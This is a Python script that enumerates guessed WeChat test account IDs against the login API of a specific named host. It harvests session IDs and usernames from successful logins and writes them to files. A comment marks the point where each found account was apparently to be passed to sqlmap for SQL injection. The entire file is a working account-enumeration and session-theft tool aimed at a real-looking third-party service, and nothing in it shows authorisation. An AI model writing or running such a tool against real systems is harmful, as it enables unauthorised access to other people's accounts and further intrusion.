#!/usr/bin/env python3
"""
Scan testwechat00X range for additional accounts
"""
import requests, urllib3, time, json, os
urllib3.disable_warnings()

TARGET = "https://apib63.bf1788.com/boxApi.php"
BASE_PARAMS = {"vendorId": "test", "signature": "test", "site": "bfc", "lang": "tw"}

def wechat_login(wechatId):
    params = {"cmd": "1000", "wechatId": wechatId, "sid": "", **BASE_PARAMS}
    try:
        resp = requests.post(TARGET, data=params, timeout=15, verify=False)
        data = resp.json()
        if str(data.get("status")) == "0":
            msg = data.get("msg", {})
            if isinstance(msg, dict) and msg.get("sid"):
                return msg.get("sid"), msg.get("username")
    except:
        pass
    return None, None

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--start", type=int, default=1)
    parser.add_argument("--end", type=int, default=999)
    parser.add_argument("--delay", type=float, default=0.05)
    parser.add_argument("--save-dir", default=".")
    args = parser.parse_args()
    
    os.makedirs(args.save_dir, exist_ok=True)
    save_dir = args.save_dir
    
    print(f"[*] Scanning testwechat{{i:03d}} range from {args.start} to {args.end}...")
    
    found = []
    for i in range(args.start, args.end + 1):
        wechatId = f"testwechat{i:03d}"
        sid, username = wechat_login(wechatId)
        
        if sid:
            result = {"wechatId": wechatId, "sid": sid, "username": username}
            found.append(result)
            print(f"[+] FOUND: wechatId={wechatId}, sid={sid}, username={username}")
            
            with open(f"{save_dir}/found_wechatids.txt", "a") as f:
                f.write(f"{wechatId}|{sid}|{username}\n")
            
            # Auto trigger sqlmap
            print(f"[*] Triggering auto SQLi for {wechatId}...")
    
        if i % 100 == 0:
            print(f"[*] Progress: {i}/{args.end} (found: {len(found)})")
        
        time.sleep(args.delay)
    
    with open(f"{save_dir}/testwechat_range_results.json", "w") as f:
        json.dump({"found": found, "total_scanned": args.end - args.start + 1}, f, indent=2)
    
    print(f"\n[*] Done! Found {len(found)} accounts")

if __name__ == "__main__":
    main()
